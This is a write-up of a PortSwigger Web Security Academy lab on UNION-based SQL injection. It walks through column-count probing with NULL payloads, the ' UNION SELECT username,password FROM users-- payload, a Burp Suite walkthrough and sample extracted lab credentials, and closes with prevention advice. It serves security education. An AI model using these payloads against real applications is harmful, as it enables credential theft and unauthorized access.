# SQL Injection UNION Attack - Retrieving Data from Other Tables

## Lab

**PortSwigger Web Security Academy**

**Lab:** SQL Injection UNION attack, retrieving data from other tables

https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-data-from-other-tables

---

# Objective

Exploit a UNION-based SQL Injection vulnerability to retrieve sensitive information stored in another database table.

In this lab the goal is to retrieve:

- Username
- Password

from the database table:

```text
users
```

---

# Prerequisites

Before retrieving data, the attacker must know:

- The application is vulnerable to SQL Injection.
- The number of columns returned by the original query.
- Which columns can display string values.

Only after identifying these can a successful UNION attack be performed.

---

# Understanding UNION SELECT

The SQL UNION operator combines the results of two SELECT statements.

Example:

```sql
SELECT name FROM products

UNION

SELECT username FROM users;
```

If both SELECT statements return the same number of columns with compatible data types, the results are merged.

Attackers abuse this behavior to retrieve data from tables they should not be able to access.

---

# Original Query

Assume the application executes:

```sql
SELECT name, description
FROM products
WHERE category='Gifts'
```

The attacker injects:

```sql
' UNION SELECT username,password FROM users--
```

The final query becomes:

```sql
SELECT name,description
FROM products
WHERE category=''

UNION

SELECT username,password
FROM users--
```

Instead of displaying product information, the application now displays usernames and passwords from the database.

---

# Step 1 - Determine the Number of Columns

The first task is identifying how many columns the original query returns.

Payload:

```sql
' UNION SELECT NULL,NULL--
```

If the page loads successfully:

```text
200 OK
```

then the query most likely contains:

```text
2 columns
```

If an error occurs:

```text
Column count mismatch
```

then try:

```sql
' UNION SELECT NULL--
```

or

```sql
' UNION SELECT NULL,NULL,NULL--
```

until the correct number is found.

---

## Observation

The payload:

```sql
' UNION SELECT NULL,NULL--
```

returned:

```text
HTTP/2 200 OK
```

Therefore:

```text
The original query returns two columns.
```

---

# Why Use NULL?

NULL is compatible with almost every SQL data type.

Instead of guessing whether a column expects:

- Integer
- String
- Date
- Boolean

attackers simply use:

```sql
NULL
```

which works in most cases.

---

# Step 2 - Identify String Columns

Since the final payload will retrieve:

```text
username

password
```

both output columns must support string data.

Once string-compatible columns are identified, they can be replaced with actual table data.

---

# Step 3 - Retrieve Data from Another Table

Payload:

```sql
' UNION SELECT username,password FROM users--
```

This instructs the database to return:

```text
username

password
```

from the:

```text
users
```

table.

---

# Database Query After Injection

```sql
SELECT name,description
FROM products
WHERE category=''

UNION

SELECT username,password
FROM users--
```

The database now returns rows from the users table instead of product information.

---

# Output

Example response:

```text
administrator
vx63m13d31w0pbbkylplm

wiener
ognq0rb0ma34745it
```

The application displays these credentials directly on the page.

---

# Login Using Retrieved Credentials

Navigate to the application's login page.

Enter:

```text
Username:

administrator
```

Password:

```text
vx63m13d31w0pbbkylplm
```

Login succeeds, completing the lab.

---

# Burp Suite Walkthrough

## Step 1

Intercept the vulnerable request.

Example:

```http
GET /filter?category=Gifts HTTP/2
```

---

## Step 2

Send the request to Repeater.

```text
Right Click

↓

Send to Repeater
```

---

## Step 3

Determine the number of columns.

Payload:

```sql
' UNION SELECT NULL,NULL--
```

Observe:

```text
HTTP/2 200 OK
```

This confirms that the original query returns two columns.

---

## Step 4

Replace NULL values with table columns.

Payload:

```sql
' UNION SELECT username,password FROM users--
```

---

## Step 5

Click:

```text
Send
```

Burp displays the HTTP response containing usernames and passwords.

---

## Step 6

Use the administrator credentials to log into the application.

Lab solved.

---

# Why Does This Attack Work?

UNION combines two SQL queries.

The application expects:

```text
Product Name

Description
```

The attacker instead returns:

```text
Username

Password
```

Because both queries have:

- The same number of columns.
- Compatible data types.

the database merges the results.

---

# Requirements for a Successful UNION Attack

The following conditions must be satisfied:

- SQL Injection vulnerability exists.
- The number of columns is known.
- Compatible data types are used.
- The application displays query results.
- Table and column names are known or discovered.

---

# Finding Table and Column Names

In real-world assessments, attackers usually do not know:

- Table names
- Column names

They must enumerate the database schema using techniques such as:

- INFORMATION_SCHEMA
- SQLite schema tables
- Oracle metadata tables
- PostgreSQL system catalogs

Once identified, the discovered names can be used in the UNION payload.

---

# Common UNION Payloads

Determine two columns:

```sql
' UNION SELECT NULL,NULL--
```

Retrieve credentials:

```sql
' UNION SELECT username,password FROM users--
```

---

# Attack Flow

```text
Identify SQL Injection

↓

Find Column Count

↓

Find String Columns

↓

Identify Table Name

↓

Identify Column Names

↓

Extract Sensitive Data

↓

Use Retrieved Credentials

↓

Gain Unauthorized Access
```

---

# Advantages of UNION-Based SQL Injection

- Fast data extraction.
- Retrieves complete database rows.
- Can expose usernames, passwords, emails, API keys, and other sensitive data.
- Requires fewer requests than Blind SQL Injection.

---

# Limitations

- Query results must be visible.
- Column count must match.
- Compatible data types are required.
- Many modern applications hide SQL errors.
- Parameterized queries prevent this attack.

---

# Prevention

- Use Prepared Statements (Parameterized Queries).
- Never concatenate user input into SQL queries.
- Validate user input.
- Apply least-privilege database permissions.
- Hide database error messages.
- Use a Web Application Firewall (WAF).
- Perform regular security testing.

---

# Key Exam Points

- UNION combines the results of multiple SELECT statements.
- Both SELECT queries must return the same number of columns.
- Compatible data types are required.
- NULL is commonly used to identify column count because it is type-compatible.
- UNION-based SQL Injection works only when query results are reflected in the application's response.
- Unlike Blind SQL Injection, UNION attacks retrieve data directly.
- Common targets include usernames, passwords, API keys, tokens, and email addresses.

---

# Lab Result

The vulnerable application allowed a UNION-based SQL Injection attack.

The attacker:

- Determined that the query returned two columns.
- Verified compatibility using `NULL`.
- Retrieved usernames and passwords from the `users` table.
- Logged in as the `administrator` user using the extracted credentials.

The lab was successfully completed.
